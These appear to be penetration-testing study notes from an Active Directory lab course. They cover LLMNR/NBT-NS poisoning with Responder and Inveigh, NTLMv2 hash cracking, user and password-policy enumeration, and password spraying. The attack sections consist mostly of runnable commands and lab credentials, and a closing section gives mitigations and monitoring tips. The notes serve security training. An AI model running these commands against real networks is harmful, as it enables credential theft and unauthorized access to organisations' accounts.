# [Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) and [NetBIOS Name Service](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN>)

### Description

Microsoft windows components that serve as alternate methods of host identification which can be used when DNS fails. 

If DNS fails the machine will ask other computers on the local network for the host address via LLMNR. Operates on **port UDP5355**. If LLMNR fails then NBT_NS will be used. It identifies them sing their NetBIOS name. **port UDP137**

Any host on the network can reply to LLMNR.
These requests can be poisoned with Responder. 
Get the system to communicate with the attacking machine.

If the host contacts responder can capture the NetNTLM hash.

### Example Attack
1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.
### Linux 
#### Responder 
Alternative flags

| Flag | Use |
| ---- | --- |
| -A   |analyse mode|
| -wf  |WPAD Rogue|
| -f   |attempt to fingerprint|
| -v   |verbose|
| -F   |Force NTLM Auth (may force login prompt)     |
| -P   |Force proxy auth (may force login prompt)     |
| -W   |Built in WPAD (use in large orgs)|

```bash
sudo responder -I <interfacename> 
```

```shell
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

### Windows
#### [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
#### Powershell
*No longer updated*
```powershell
Import-Module .\Inveigh.ps1
```

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

Output to a console and write to a file.
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

#### C# Inveigh
```powershell
.\Inveigh.exe
```
Use `esc` to enter and exit the console
Get unique hashes typing 
```
GET NTLMV2UNIQUE
```
Get unique Usernames 
```
GET NTLMV2USERNAMES
```

## Mitigiaiton

We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.

PowerShell script to disable NBT-NS
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
Push out on a domain
`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`

Monitor UDP 5355, 137 and event IDs 4697 and 7045 for responses. 

Look for changes to regkey `EnableMulticast` to 0 in: 
`HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`

# Password Spraying

## Description 
Attempting to use one common password and a long list of usernames 

May have gathered usernames from OSINT 

Password Spray Visualisation

|**Attack**|**Username**|**Password**|
|---|---|---|
|1|bob.smith@inlanefreight.local|Welcome1|
|1|john.doe@inlanefreight.local|Welcome1|
|1|jane.doe@inlanefreight.local|Welcome1|
|DELAY|||
|2|bob.smith@inlanefreight.local|Passw0rd|
|2|john.doe@inlanefreight.local|Passw0rd|
|2|jane.doe@inlanefreight.local|Passw0rd|
|DELAY|||
|3|bob.smith@inlanefreight.local|Winter2022|
|3|john.doe@inlanefreight.local|Winter2022|
|3|jane.doe@inlanefreight.local|Winter2022|

Less likely to lock out an account that brute forcing 

## Working out the password Policy
### Enumerating the Password Policy from Linux - Credentialed
#### With valid creds 
```shell
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

#### SMB NULL Sessions 
allows unauthenticated attacker to retrieve information from the domain. 
Often the result of legacy DCs being upgraded in place, bringing insecure configurations.

##### Linux
###### RPCClient
```shell
rpcclient -U "" -N <ip>

querydominfo
```
###### enum4linux
```shell
enum4linux -P <ip>
```
###### enum4linux-ng
[Git](https://github.com/cddmp/enum4linux-ng)
```shell
num4linux-ng -P 172.16.5.5 -oA ilfreight

cat ilfreight.json 
```
##### Windows
```cmd
net use \\DC01\ipc$ "" /u:""
```
### Enumerating the Password Policy from Linux - [LDAP Anonymous Bind](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)
Allows unauthenticated attackers to retrieve information from the domain.
Legacy configuration up to Windows Server 2003. 
#### ldapsearch 
```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Enumerating the password policy from Windows 
#### net.exe
```cmd
net accounts
```
#### PowerView
```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```


## Making a Target User Wordlist
To get Usernames:
- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist.

If you do not know the password policy, try one spray every few hours in an attempt to not lock accounts out. 
Always keep a log of what you do. 
- The accounts targeted
- Domain Controller used in the attack
- Time of the spray
- Date of the spray
- Password(s) attempted

### Pull User list with SMB NULL sessions.
#### enum4linux
```shell
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
#### rpcclient
```shell
rpcclient -U "" -N 172.16.5.5

enumdomusers
```
#### CrackMapExec
```shell
crackmapexec smb 172.16.5.5 --users
```
### Get users with LDAP Anonymous
#### ldap search
```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
#### windapsearch
```shell
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Enumerate Users with Kerbrute 
Using [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt)wordlist
```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt -o users
```
Get all users with CME
```shell
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

##  Internal Password Spraying from Linux
### Find a valid username:password
#### RPCClient
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%<password>" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
#### Kerbrute 
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  <password>
```
#### CrackMapExec
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
### Validate 
```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
### Local Administrator Password Reuse
Target high value targets such as SQL and Microsoft Exchange
**Password Formats**
$desktop%@admin123
$server%@admin123

Or similar passwords for domain accounts. 

#### NTLM local admin spraying

May only get the NTLM hash from SAM database.
```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Internal Password Spraying from Windows
[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) Tool
```powershell
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
Note:
Without the -userlist flag the tool will make its own

## External Password Spraying 
Common Applications
- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication
-
